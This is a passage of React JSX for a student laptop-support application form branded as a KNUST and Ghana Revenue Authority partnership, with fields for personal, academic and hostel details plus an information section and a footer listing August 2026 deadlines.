                  </div>

                </div>

                <div className="form-grid">

                  {/* FIRST NAME */}

                  <div className="field">

                    <label htmlFor="firstName">

                      First Name{" "}

                      <span className="required">
                        *
                      </span>

                    </label>

                    <input
                      id="firstName"
                      name="firstName"
                      type="text"
                      placeholder="First name"
                      value={formData.firstName}
                      onChange={handleChange}
                      className={
                        errors.firstName
                          ? "error"
                          : ""
                      }
                    />

                    {errors.firstName && (

                      <p className="field-error">
                        {errors.firstName}
                      </p>

                    )}

                  </div>

                  {/* MIDDLE NAME */}

                  <div className="field">

  <label htmlFor="middleName">
  Middle Name <span>(Optional)</span>
</label>

                    <input
                      id="middleName"
                      name="middleName"
                      type="text"
                      placeholder="Middle name"
                      value={formData.middleName}
                      onChange={handleChange}
                      className={
                        errors.middleName
                          ? "error"
                          : ""
                      }
                    />

                    {errors.middleName && (

                      <p className="field-error">
                        {errors.middleName}
                      </p>

                    )}

                  </div>

                  {/* LAST NAME */}

                  <div className="field">

                    <label htmlFor="lastName">

                      Last Name{" "}

                      <span className="required">
                        *
                      </span>

                    </label>

                    <input
                      id="lastName"
                      name="lastName"
                      type="text"
                      placeholder="Last name"
                      value={formData.lastName}
                      onChange={handleChange}
                      className={
                        errors.lastName
                          ? "error"
                          : ""
                      }
                    />

                    {errors.lastName && (

                      <p className="field-error">
                        {errors.lastName}
                      </p>

                    )}

                  </div>

                  {/* CONTACT */}

                  <div className="field">

                    <label htmlFor="contact">

                      Contact Number{" "}

                      <span className="required">
                        *
                      </span>

                    </label>

                    <input
                      id="contact"
                      name="contact"
                      type="tel"
                      inputMode="numeric"
                      maxLength={10}
                      placeholder="0241234567"
                      value={formData.contact}
                      onChange={handleChange}
                    />

              
                    {errors.contact && (

                      <p className="field-error">
                        {errors.contact}
                      </p>

                    )}

                  </div>

                </div>

              </div>

              {/* =================================================
                  STEP 2
              ================================================== */}

              <div className="form-step">

                <div className="step-heading">

                  <div className="step-number">
                    02
                  </div>

                  <div>

                    <h3>
                      Academic Information
                    </h3>

                    <p>
                      Provide your current university
                      academic details.
                    </p>

                  </div>

                </div>

                <div className="form-grid">

                  {/* INDEX NUMBER */}

                  <div className="field">

                    <label htmlFor="indexNumber">

                      Index Number{" "}

                      <span className="required">
                        *
                      </span>

                    </label>

                    <input
                      id="indexNumber"
                      name="indexNumber"
                      type="text"
                      placeholder="Your index number"
                      value={formData.indexNumber}
                      onChange={handleChange}
                      className={
                        errors.indexNumber
                          ? "error"
                          : ""
                      }
                    />

                    {errors.indexNumber && (

                      <p className="field-error">
                        {errors.indexNumber}
                      </p>

                    )}

                  </div>

                  {/* YEAR */}

                  <div className="field">

                    <label htmlFor="year">

                      Current Year{" "}

                      <span className="required">
                        *
                      </span>

                    </label>

                    <select
                      id="year"
                      name="year"
                      value={formData.year}
                      onChange={handleChange}
                      className={
                        errors.year
                          ? "error"
                          : ""
                      }
                    >

                      <option value="">
                        Select your year
                      </option>

                      <option value="Year 1">
                        Year 1
                      </option>

                      <option value="Year 2">
                        Year 2
                      </option>

                      <option value="Year 3">
                        Year 3
                      </option>

                      <option value="Year 4">
                        Year 4
                      </option>

                      <option value="Year 5">
                        Year 5
                      </option>

                      <option value="Year 6">
                        Year 6
                      </option>

                    </select>

                    {errors.year && (

                      <p className="field-error">
                        {errors.year}
                      </p>

                    )}

                  </div>

                  {/* PROGRAMME */}

                  <div className="field full">

                    <label htmlFor="programme">

                      Programme of Study{" "}

                      <span className="required">
                        *
                      </span>

                    </label>

                    <input
                      id="programme"
                      name="programme"
                      type="text"
                      placeholder="e.g. BSc Computer Science"
                      value={formData.programme}
                      onChange={handleChange}
                      className={
                        errors.programme
                          ? "error"
                          : ""
                      }
                    />

                    {errors.programme && (

                      <p className="field-error">
                        {errors.programme}
                      </p>

                    )}

                  </div>

                </div>

              </div>

              {/* =================================================
                  STEP 3
              ================================================== */}

              <div className="form-step">

                <div className="step-heading">

                  <div className="step-number">
                    03
                  </div>

                  <div>

                    <h3>
                      Accommodation
                    </h3>

                    <p>
                      Tell us where you currently reside.
                    </p>

                  </div>

                </div>

                <div className="form-grid">

                  {/* HOSTEL TYPE */}

                  <div className="field">

                    <label htmlFor="hostelType">

                      Hostel Type{" "}

                      <span className="required">
                        *
                      </span>

                    </label>

                    <select
                      id="hostelType"
                      name="hostelType"
                      value={formData.hostelType}
                      onChange={handleChange}
                      className={
                        errors.hostelType
                          ? "error"
                          : ""
                      }
                    >

                      <option value="">
                        Select hostel type
                      </option>

                      <option value="KNUST-owned">
                        KNUST-owned hostel
                      </option>

                      <option value="Private">
                        Private hostel
                      </option>

                    </select>

                    {errors.hostelType && (

                      <p className="field-error">
                        {errors.hostelType}
                      </p>

                    )}

                  </div>

                  {/* HOSTEL NAME */}

                  <div className="field">

                    <label htmlFor="hostel">

                      Hostel Name{" "}

                      <span className="required">
                        *
                      </span>

                    </label>

                    {formData.hostelType ===
                    "KNUST-owned" ? (

                      <select
                        id="hostel"
                        name="hostel"
                        value={formData.hostel}
                        onChange={handleChange}
                        className={
                          errors.hostel
                            ? "error"
                            : ""
                        }
                      >

                        <option value="">
                          Select KNUST hostel
                        </option>

                        {KNUST_HOSTELS.map(
                          (hostel) => (

                            <option
                              key={hostel}
                              value={hostel}
                            >
                              {hostel}
                            </option>

                          )
                        )}

                      </select>

                    ) : (

                      <input
                        id="hostel"
                        name="hostel"
                        type="text"
                        placeholder={
                          formData.hostelType ===
                          "Private"
                            ? "Enter private hostel name"
                            : "Select hostel type first"
                        }
                        value={formData.hostel}
                        onChange={handleChange}
                        disabled={
                          !formData.hostelType
                        }
                        className={
                          errors.hostel
                            ? "error"
                            : ""
                        }
                      />

                    )}

                    {errors.hostel && (

                      <p className="field-error">
                        {errors.hostel}
                      </p>

                    )}

                  </div>

                </div>

                {/* VERIFICATION */}

                <div className="verification-notice">

                  <div className="verification-icon">
                    ✓
                  </div>

                  <div>

                    <strong>
                      Qualification & Verification
                    </strong>

                    <p>

                      All applications will undergo verification.
                      Please ensure that your name, index number,
                      academic information and accommodation
                      details are accurate before submitting.

                    </p>

                  </div>

                </div>

              </div>

              {/* =================================================
                  SUBMIT
              ================================================== */}

              <div className="submit-section">

                <button
                  type="submit"
                  className="submit-button"
                  disabled={isSubmitting}
                >

                  {isSubmitting
                    ? "Submitting application..."
                    : "Submit Application"}

                </button>

                <p className="form-disclaimer">

                  By submitting this application, you confirm
                  that the information supplied is accurate and
                  may be used for eligibility assessment and
                  verification associated with this initiative.

                </p>

              </div>

            </form>

          </div>

        </div>

      </section>

      {/* ======================================================
          INFORMATION
      ====================================================== */}

      <section className="information-section">

        <div className="information-header">

          <span>
            How it works
          </span>

          <h2>
            Simple. Fair. Verified.
          </h2>

        </div>

        <div className="information-grid">

          <div className="information-card">

            <div className="information-icon">
              01
            </div>

            <h3>
              Submit your application
            </h3>

            <p>

              Complete the application form with your
              academic and accommodation information before
              the deadline.

            </p>

          </div>

          <div className="information-card">

            <div className="information-icon">
              02
            </div>

            <h3>
              Applications are verified
            </h3>

            <p>

              Submitted information will be reviewed as
              part of the qualification and verification
              process.

            </p>

          </div>

          <div className="information-card">

            <div className="information-icon">
              03
            </div>

            <h3>
              Selected students contacted
            </h3>

            <p>

              Selected applicants will be contacted on
              Monday, 31 August 2026 for further information.

            </p>

          </div>

        </div>

      </section>

      {/* ======================================================
          FOOTER
      ====================================================== */}

      <footer className="footer">

        <div className="footer-main">

          {/* BRAND */}

          <div className="footer-brand">

            <div className="footer-logo">

              
                Replace with:

                <img
                  src={knustLogo}
                  alt="KNUST Logo"
                />
             

              {/* <div className="footer-logo-text">
                KNUST
              </div> */}

            </div>

            <div>

              <h3>
                Student Laptop Support Initiative
              </h3>

              <p>

                A partnership initiative supporting
                students through improved access to digital
                technology for learning, research and
                academic development.

              </p>

            </div>

          </div>

          {/* PARTNERS */}

          <div className="footer-column">

            <h4>
              Partnership
            </h4>

            <p>
              Kwame Nkrumah University of Science
              and Technology
            </p>

            <p>
              Ghana Revenue Authority
            </p>

            <p>
              Student Digital Access Initiative
            </p>

          </div>

          {/* DATES */}

          <div className="footer-column">

            <h4>
              Important Dates
            </h4>

            <p>
              Application deadline
            </p>

            <p>
              Friday, 28 August 2026
            </p>

            <p>
              Selected applicants contacted
            </p>

            <p>
              Monday, 31 August 2026
            </p>

          </div>

        </div>

        <div className="footer-bottom">

          <span>
            © 2026 Student Laptop Support Initiative
          </span>

          <span>
            KNUST × GRA Partnership
          </span>

        </div>

      </footer>

    </div>
  );
}

export default App;